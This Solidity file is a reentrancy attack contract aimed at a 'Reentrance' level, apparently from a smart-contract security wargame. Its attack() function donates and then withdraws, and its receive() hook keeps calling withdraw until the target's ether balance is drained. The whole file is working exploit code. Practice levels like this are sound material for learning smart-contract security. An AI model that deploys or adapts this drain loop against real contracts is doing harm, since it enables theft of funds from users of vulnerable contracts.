// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../levels/10-Reentrance.sol";

contract ReentranceAttacker {
    Reentrance public reentrance;
    uint constant AMOUNT = .001 ether;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function attack() external payable {
        reentrance.donate{value: AMOUNT}(address(this));
        reentrance.withdraw(AMOUNT);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(AMOUNT);
        }
    }
}